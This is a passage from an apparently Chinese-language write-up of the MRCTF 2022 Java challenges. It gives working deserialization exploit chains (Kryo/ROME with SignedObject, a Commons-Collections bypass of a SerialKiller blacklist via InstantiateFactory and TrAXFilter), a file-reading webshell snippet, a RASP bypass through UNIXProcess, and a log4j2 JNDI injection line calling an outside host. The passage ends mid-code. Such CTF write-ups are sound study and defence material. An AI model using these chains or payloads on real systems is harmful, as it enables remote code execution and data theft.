class="number">5</span>, <span class="keyword">char</span>], </span><br><span class="line"><span class="keyword">long</span>=[<span class="number">7</span>, <span class="keyword">long</span>], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Byte</span></span>=[<span class="number">4</span>, <span class="keyword">byte</span>], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Character</span></span>=[<span class="number">5</span>, <span class="keyword">char</span>], </span><br><span class="line"><span class="keyword">double</span>=[<span class="number">8</span>, <span class="keyword">double</span>], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Short</span></span>=[<span class="number">6</span>, <span class="keyword">short</span>], </span><br><span class="line"><span class="keyword">int</span>=[<span class="number">0</span>, <span class="keyword">int</span>], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Integer</span></span>=[<span class="number">0</span>, <span class="keyword">int</span>], </span><br><span class="line"><span class="keyword">byte</span>=[<span class="number">4</span>, <span class="keyword">byte</span>], </span><br><span class="line"><span class="keyword">float</span>=[<span class="number">2</span>, <span class="keyword">float</span>], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Double</span></span>=[<span class="number">8</span>, <span class="keyword">double</span>], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Boolean</span></span>=[<span class="number">3</span>, <span class="keyword">boolean</span>], </span><br><span class="line"><span class="keyword">boolean</span>=[<span class="number">3</span>, <span class="keyword">boolean</span>], </span><br><span class="line"><span class="keyword">short</span>=[<span class="number">6</span>, <span class="keyword">short</span>], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Long</span></span>=[<span class="number">7</span>, <span class="keyword">long</span>], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span></span>=[<span class="number">1</span>, String], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Float</span></span>=[<span class="number">2</span>, <span class="keyword">float</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们再来看在抛出异常的那部分，如果将registrationRequired设置为false，则可以略过这些过程</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/15.png"></p><p>此时它会执行<code>com.esotericsoftware.kryo.util.DefaultClassResolver#registerImplicit</code></p><p>=&gt;<code>com.esotericsoftware.kryo.Kryo#getDefaultSerializer</code>最终获取到我们需要的<code>com.esotericsoftware.kryo.serializers.MapSerializer</code></p><p>通过比对属性以及上面提到的可利用的set方法，我们能很容易通过payload的传入控制这个过程</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;RegistrationRequired&quot;</span>:<span class="literal">false</span>&#125;</span><br></pre></td></tr></table></figure><p>ok当你感觉又行的时候，又兴致冲冲运行了代码，此时又出现<code>Class cannot be created (missing no-arg constructor):</code>，字面意思是我们序列化的类需要有无参构造函数</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/16.png"></p><p>那我们再跟进代码看看实例化报错到底是怎么回事，在实例化一个类的时候会通过调用<code>com.esotericsoftware.kryo.Kryo#newInstantiator</code>，</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/18.png"></p><p>并最终会调用到<code>com.esotericsoftware.kryo.util.DefaultInstantiatorStrategy#newInstantiatorOf</code></p><p>此时的调用栈为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">newInstantiatorOf:<span class="number">96</span>, DefaultInstantiatorStrategy (com.esotericsoftware.kryo.util)</span><br><span class="line">newInstantiator:<span class="number">1190</span>, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">newInstance:<span class="number">1199</span>, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">create:<span class="number">163</span>, FieldSerializer (com.esotericsoftware.kryo.serializers)</span><br><span class="line">read:<span class="number">122</span>, FieldSerializer (com.esotericsoftware.kryo.serializers)</span><br><span class="line">readClassAndObject:<span class="number">880</span>, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">read:<span class="number">226</span>, MapSerializer (com.esotericsoftware.kryo.serializers)</span><br><span class="line">read:<span class="number">42</span>, MapSerializer (com.esotericsoftware.kryo.serializers)</span><br><span class="line">readClassAndObject:<span class="number">880</span>, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">read:<span class="number">226</span>, MapSerializer (com.esotericsoftware.kryo.serializers)</span><br><span class="line">read:<span class="number">42</span>, MapSerializer (com.esotericsoftware.kryo.serializers)</span><br><span class="line">readClassAndObject:<span class="number">880</span>, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">deser:<span class="number">110</span>, Testt (demo)</span><br><span class="line">main:<span class="number">126</span>, Testt (demo)</span><br></pre></td></tr></table></figure><p>可以看到抛错的原因就是下面的这串代码，它默认我们的类有无参构造函数</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/17.png"></p><p>那为了解决这个问题我们也得知道是否可以不使用<code>DefaultInstantiatorStrategy</code>，转而使用其他<code>InstantiatorStrategy</code>的子类呢，答案是可以的，上面我们可以看到函数实例化的过程是通过<code>this.strategy.newInstantiatorOf(type)</code>，而这个<code>DefaultInstantiatorStrategy</code>来源于<code>strategy</code>属性</p><p>正好在Kryo类当中有set方法可以实现，<code>com.esotericsoftware.kryo.Kryo#setInstantiatorStrategy</code>，可以看到如果是<code>StdInstantiatorStrategy</code>类则正好符合（官方文档比代码好看）</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/19.png"></p><p>因此我们得到最终传参</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;polish&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;RegistrationRequired&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;InstantiatorStrategy&quot;</span>: <span class="string">&quot;org.objenesis.strategy.StdInstantiatorStrategy&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>可以看到又报错了，<code>_tfactory</code>空指针异常</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/20.png"></p><p>这里如何解决呢？其实很简单，别忘了我们这个可是打ROME，通过触发<code>com.rometools.rome.feed.impl.EqualsBean#beanEquals</code>我们能调用任意get方法，这时候不难想到二次反序列化，<code>java.security.SignedObject#getObject</code>，其实就是虎符的思路了没啥难度</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// creating a stream pipe-line, from b to a</span></span><br><span class="line">    ByteArrayInputStream b = <span class="keyword">new</span> ByteArrayInputStream(<span class="keyword">this</span>.content);</span><br><span class="line">    ObjectInput a = <span class="keyword">new</span> ObjectInputStream(b);</span><br><span class="line">    Object obj = a.readObject();</span><br><span class="line">    b.close();</span><br><span class="line">    a.close();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此不难得到payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payloadhere</span><br></pre></td></tr></table></figure><h3 id="绕Rasp"><a href="#绕Rasp" class="headerlink" title="绕Rasp"></a>绕Rasp</h3><p>这时候你注入内存马执行会发现什么都是空的</p><p>这时候你一定很疑问为什么本地打通了远程不行，我也很疑惑，之后看到出题人说</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/21.png"></p><p>既然存在waf，那么我们第一件事情是什么呢，当然是验证是否是对payload的过滤</p><p>因此我将执行的字节码改成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread.sleep(<span class="number">10000</span>);</span><br></pre></td></tr></table></figure><p>成功看到页面延时</p><p>这时候猜到可能有Rasp(毕竟对于Java过滤base64解码后的字符串有点傻)</p><p>那第一步就要知道rasp的文件内容，用个之前从p牛那里学的伪协议小trick方便我读文件以及列目录</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String urlContent = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">final</span> URL url = <span class="keyword">new</span> URL(request.getParameter(<span class="string">&quot;read&quot;</span>));</span><br><span class="line"><span class="keyword">final</span> BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span></span><br><span class="line">                                             InputStreamReader(url.openStream()));</span><br><span class="line">String inputLine = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">  urlContent = urlContent + inputLine + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">in.close();</span><br><span class="line">writer.println(urlContent);</span><br></pre></td></tr></table></figure><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/22.png"></p><p>之后成功得到rasp的地址，<code>/app/jrasp.jar</code>，那么下载下来分析即可，图没截完，意思是只要执行到<code>java.lang.ProcessImpl</code>的<code>start</code>方法,而这也就封掉了之前常见的<code>Runtime</code>,<code>ProcessBuilder</code>，甚至js执行之类的，el执行都不行，道理很简单会调用到<code>java.lang.ProcessImpl</code></p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/23.png"></p><p>如何绕过也很简单去找更下一层的调用即可，也就是通过<code>UNIXProcess</code>即可</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/24.png"></p><p>后面很恶心一个计算题</p><p>脚本有个地方小错误导致三小时没找到前面不能加<code>CHLD_IN</code>导致提前输入错误答案似乎</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> IPC::Open3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">&#x27;/readflag&#x27;</span> ) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">&quot;open3() failed!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $r;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r&quot;</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r&quot;</span>;</span><br><span class="line">$r = <span class="keyword">substr</span>($r,<span class="number">0</span>,-<span class="number">3</span>);</span><br><span class="line">$r = <span class="keyword">eval</span> <span class="string">&quot;$r&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> CHLD_IN <span class="string">&quot;$r\n&quot;</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="EzJava-–-Bypass-Serialkiller"><a href="#EzJava-–-Bypass-Serialkiller" class="headerlink" title="EzJava – Bypass Serialkiller"></a>EzJava – Bypass Serialkiller</h2><h3 id="解读环境"><a href="#解读环境" class="headerlink" title="解读环境"></a>解读环境</h3><p>首先附件给了两个东西一个jar，一个serialkiller的配置文件，下面是jar当中的目录架构</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/3.png"></p><p>这有两个控制器但是第一个没啥意义，这个路由很明显需要反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloController</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/hello&quot;&#125;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/hello&quot;&#125;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(<span class="meta">@RequestBody</span> String baseStr)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] decode = Base64.getDecoder().decode(baseStr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> SerialKiller(<span class="keyword">new</span> ByteArrayInputStream(decode), <span class="string">&quot;serialkiller.xml&quot;</span>);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单看下SerialKiller类，实现是载入配置获得黑白名单，通过resolveClass做了过滤，接下来就来看看黑名单，将我们反序列化的关键点给拿捏了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blacklist</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- ysoserial&#x27;s CommonsCollections1,3,5,6 payload  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.Transformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functors\.InvokerTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functors\.ChainedTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functors\.ConstantTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functors\.InstantiateTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- ysoserial&#x27;s CommonsCollections2,4 payload  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections4\.functors\.InvokerTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections4\.functors\.ChainedTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections4\.functors\.ConstantTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections4\.functors\.InstantiateTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections4\.comparators\.TransformingComparator$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blacklist</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>既然如此那么首先就是想到去找替换类达到同样的效果咯</p><p>下面是我通过简单搜索发现的类，当然后面发现解决这题方案很多，我只给一个</p><h4 id="FactoryTransformer"><a href="#FactoryTransformer" class="headerlink" title="FactoryTransformer"></a>FactoryTransformer</h4><p>可以看到这个trnasfromer的transform方法，可以调用任意Factory子类的create方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FactoryTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">6817674502475353160L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Factory iFactory;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title">getInstance</span><span class="params">(Factory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> FactoryTransformer(factory);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FactoryTransformer</span><span class="params">(Factory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iFactory = factory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iFactory.create();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Factory <span class="title">getFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iFactory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到也不多，从名字就可以看出，其中有两个可以用的</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/4.png"></p><p>其中<code>org.apache.commons.collections.functors.ConstantFactory#create</code>可以返回任意值</p><p>代替<code>ConstantTransformer</code></p><p><code>org.apache.commons.collections.functors.InstantiateFactory#create</code>可以实例化任意类</p><p>代替<code>InstantiateTransformer</code>去实例化对象</p><p>那看到这里你有什么思路了吗？熟悉CC链的童鞋一定会知道TrAXFilter的构造函数当中可以帮助我们触发TemplatesImpl字节码加载的过程</p><p>通过如下构造，我们能很轻松的触发计算器</p><p>Ps小细节：对expMap做put操作会触发hashCode会导致利用链在序列化过程当中触发导致报错，别忘了先设置一个无关紧要的transformer(比如ConstantTransformer)最后再反射替换成我们恶意的Transformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.FactoryTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.nibblesec.tools.SerialKiller;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        InstantiateFactory instantiateFactory;</span><br><span class="line">        instantiateFactory = <span class="keyword">new</span> InstantiateFactory(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class</span><br><span class="line">        ,<span class="keyword">new</span> Class[]&#123;javax.xml.transform.Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;obj&#125;);</span><br><span class="line"></span><br><span class="line">        FactoryTransformer factoryTransformer = <span class="keyword">new</span> FactoryTransformer(instantiateFactory);</span><br><span class="line"></span><br><span class="line">        ConstantTransformer constantTransformer = <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap outerMap = (LazyMap)LazyMap.decorate(innerMap, constantTransformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        setFieldValue(outerMap,<span class="string">&quot;factory&quot;</span>,factoryTransformer);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(expMap);</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> SerialKiller(byteArrayInputStream, <span class="string">&quot;/Users/y4tacker/Downloads/ezjavaz/serialkiller.xml&quot;</span>);</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/5.png"></p><p>后面就是获取注入一个内存马即可获取flag，这部分不谈基础东西而已</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/6.jpg"></p><p>那么就结束了这一题</p><h2 id="Java-mem-shell-Filter"><a href="#Java-mem-shell-Filter" class="headerlink" title="Java_mem_shell_Filter"></a>Java_mem_shell_Filter</h2><p>首先只给了一个登录功能</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/2.png"></p><p>通过随便访问不存在页面，导致报错抛出也可以得到是tomcat8.0.12版本，那版本问题可以忽略了</p><p>接下来由于后端响应真的很快，在公共环境下能做到这样首先考虑弱口令，爆破无效</p><p>突然想到能不能打log4j2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=$&#123;jndi:rmi://xxxxx/exp&#125;&amp;password=admin</span><br></pre></td></tr></table></figure><p>后面拿flag也是比较阴间，这里不重要不写了，涉及到dump内存的操作还是写写吧</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 